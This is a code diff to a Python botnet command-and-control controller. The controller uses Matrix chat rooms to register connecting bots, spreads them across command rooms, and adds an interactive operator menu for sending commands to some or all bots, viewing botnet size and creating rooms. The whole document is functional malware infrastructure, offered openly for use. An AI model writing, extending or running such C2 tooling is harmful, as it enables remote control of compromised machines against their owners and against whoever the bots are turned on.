@@ -1,3 +1,4 @@
+import random
 from typing import Self
 import uuid
 from matrix_client.client import MatrixClient, Room
@@ -109,22 +110,61 @@ class BotnetController:
 
     def on_message(self, room, event):
         msgbody: str = event["content"]["body"]
-        if msgbody.startswith("CONNECT"):
-            msgbody = msgbody.removeprefix("CONNECT:")
-            msgbody = json.loads(msgbody)
-            botid = msgbody["bot_id"]
-            self.announce_room.send_text(
-                f"RESOLVE {botid}:{COMMAND_ROOM_ID}"
-            )
-            self.assign_bot(msgbody, COMMAND_ROOM_ID)
+        if not msgbody.startswith("CONNECT:"):
+            return
+        msgbody = msgbody.removeprefix("CONNECT:")
+        msgbody = json.loads(msgbody)
+        botid = msgbody["bot_id"]
+        # Uniform distr so should be fine
+        room_id = random.choice(list(self.command_rooms.keys()))
+        self.announce_room.send_text(
+            f"RESOLVE {botid}:{room_id}"
+        )
+        self.assign_bot(msgbody, room_id)
             
-    def create_room(self, name) -> Room:
-        return self.client.create_room(name, is_public=False)
+    def create_room(self, name: str) -> Room:
+        room: Room = self.client.create_room(name, is_public=False)
+        room.name = name
+        return room
     
-    def add_command_room(self):
-        new_room = self.create_room(f"commandroom{uuid.uuid4()}")
+    def add_command_room(self, name: str):
+        new_room = self.create_room(name)
         self.command_rooms[new_room.room_id] = CommandRoom(new_room)
             
+
+    def command_option(self):
+        command = input("Command: ")
+        all_rooms = input("Would you like to send command to all rooms [Y/n]? ").lower()
+        if all_rooms == 'y':
+            self.send_to_all(command)
+            return
+        room_list = list(self.command_rooms.items())
+        print("To which room would you like to send a command?")
+        for idx, (_, room) in enumerate(room_list):
+            print(f"# {idx} | {room.room.name}: {len(room.bots)} bots")
+        room_nr = int(input("Choose room number: "))
+        if room_nr >= len(room_list):
+            print("realy??")
+            return
+        
+        _, room = room_list[room_nr]
+        self.send_command(command, room)
+
+        
+    def show_state_option(self):
+        total_bot_count = 0
+        for room_id, room in self.command_rooms.items():
+            bot_count = len(room.bots)
+            total_bot_count += bot_count
+            print(f"Room: {room.room.name}: {bot_count} bots")
+        print(f"Total Bots: {total_bot_count}")
+        
+
+    def create_room_option(self):
+        room_name = input("Room name: ")
+        room_name = room_name.replace(" ", "_")
+        self.add_command_room(room_name)
+
     def run(self):
         self.login()
         self.join_rooms()
@@ -132,13 +172,25 @@ class BotnetController:
         self.announce_room.add_listener(self.on_message)
         self.client.start_listener_thread()
         
-        room = self.add_command_room()
         
         print("[+] Controller ready. Enter commands to send to bots.")
         while True:
-            command = input("Enter command for bots: ")
-            self.send_to_all(command)
+            print("#1 Send Command")
+            print("#2 Show botnet state")
+            print("#3 Create Room")
+            option = int(input("What would you like to do?"))
+            print()
+            match option:
+                case 1:
+                    self.command_option()
+                case 2:
+                    self.show_state_option()
+                case 3:
+                    self.create_room_option()
+                case _:
+                    print("Invalid Option, choose again")
 
+            print("-----------------------------------------")
 if __name__ == "__main__":
     controller = BotnetController()
     controller.run()
